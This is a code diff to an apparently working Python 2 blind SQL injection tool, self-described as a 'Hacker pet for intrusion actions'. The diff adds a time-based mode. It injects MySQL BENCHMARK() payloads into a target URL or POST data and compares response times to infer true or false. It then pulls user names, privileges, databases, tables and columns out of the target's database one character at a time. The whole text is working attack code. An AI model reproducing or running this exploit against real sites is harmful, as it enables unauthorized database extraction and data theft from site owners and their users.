@@ -1,3 +1,4 @@
+#!/usr/bin/env python2
 import re
 import sys
 import argparse
@@ -5,13 +6,13 @@ from urllib  import quote_plus
 from urllib2 import urlopen
 from Queue     import Queue
 from threading import Thread
+from time      import time
 from datetime  import datetime
 
 p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
 p.add_argument( '-u' , '--url'              , required = True          , help = 'url with possible GET data'      )
 p.add_argument( '-p' , '--post'             , metavar = 'POST'         , help = 'to send POST data use this var'  )
 p.add_argument( '-c' , '--cookie'           , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
-p.add_argument( '-s' , '--string'           , required = True          , help = 'string to search on the page'    )
 p.add_argument( '-v' , '--verbose'          , action = 'append_const' , const = 1, default = [],  help = 'how much verbose should be output' )
 p.add_argument( '-a' , '--avoid'            , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
 p.add_argument( '-e' , '--error2false'      , action = 'store_const', const = True, help = 'if server return error identify this fact as false answer for SQL query' )
@@ -19,6 +20,10 @@ p.add_argument( '-E' , '--engine'           , default = 'mysql', choices = ['mys
 p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
 p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
 p.add_argument( '-U' , metavar = 'TABLE'    , help = 'username to use' )
+
+g = p.add_mutually_exclusive_group( required=True )
+g.add_argument( '-s' , '--string'                                           ,  help = 'string to search on the page'    )
+g.add_argument( '-t' , '--timebased' , action = 'store_const', const = True ,  help = 'time based test (BENCHMARK())'   )
 
 g = p.add_mutually_exclusive_group( required=True )
 g.add_argument( '-g' , '--get', choices = [ 'user', 'privs', 'dbs', 'tables', 'columns' ], help = 'wich object to retrieve from database' )
@@ -45,14 +50,40 @@ class Searcher( object ):
             sys.stdout.flush()
 
     def test( self, sql ):
-        url  = self.url.replace( '@', quote_plus( sql ) )
-        post = self.post and self.post.replace( '@', quote_plus( sql ) )
         try:
-            self.log( 2, '...testing url=%s POST=%s ' % ( url, post ), newline = False )
-            html = urlopen( url, post ).read()
-            self.log( 2, '--> %s' % ( self.sss in html ) )
-            self.log( 3, '----html----\n%s\n----html----\n' % html )
-            return self.sss in html
+            if self.bench:  ## use benchmark for yes/no detection
+                sql_b  = 'if(%s,benchmark(20000000,now()),1)' % sql
+                url_b  = self.url.replace( '@', quote_plus( sql_b ) )
+                post_b = self.post and self.post.replace( '@', quote_plus( sql_b ) )
+
+                sql_s  = 'if(%s,benchmark(300,now()),1)' % sql
+                url_s  = self.url.replace( '@', quote_plus( sql_s ) )
+                post_s = self.post and self.post.replace( '@', quote_plus( sql_s ) )
+
+                bt = time() ## current time
+                html = urlopen( url_b, post_b ).read()
+                bt = time() - bt
+                self.log( 2, 'GET:\t%s\nPOST:\t%s' % ( url_b, post_b ) )
+                self.log( 2, '--> %s\n' % bt )
+
+                st = time()
+                html = urlopen( url_s, post_s ).read()
+                st = time() - st
+                self.log( 2, 'GET:\t%s\nPOST:\t%s' % ( url_s, post_s ) )
+                self.log( 2, '--> %s\n' % st )
+                self.log( 2, '--> bt / st = %s\n' % ( bt / st ) )
+
+                return bt / st > 2
+                
+            else:
+                url  = self.url.replace( '@', quote_plus( sql ) )
+                post = self.post and self.post.replace( '@', quote_plus( sql ) )
+
+                self.log( 2, 'GET:\t%s\nPOST:\t%s' % ( url, post ) )
+                html = urlopen( url, post ).read()
+                self.log( 2, '--> %s\n' % ( self.sss in html ) )
+                self.log( 3, '----html----\n%s\n----html----\n' % html )
+                return self.sss in html
         except Exception, e:
             if args.error2false:
                 self.log( 2, '--> error %s' % e )
@@ -130,7 +161,7 @@ class Searcher( object ):
             c = self.get_number( 'ASCII(SUBSTRING(%s,%s,1))' % ( sql, i+1 ), lmin = lmin, lmax = lmax )
             res += chr( c )
             self.log( 0, chr( c ), newline = False )
-        self.log( 0, '' )
+        self.log( 0, '--> ' + res )
         return res
 
 
@@ -176,7 +207,8 @@ class SQL:
         return self.prepare( s % kargs )
 
 s = Searcher( url = args.url,
-              sss = args.string,
+              sss   = args.string,
+              bench = args.timebased,
               post = args.post,
               th_num = 1,
               log_lvl = len( args.verbose ) )
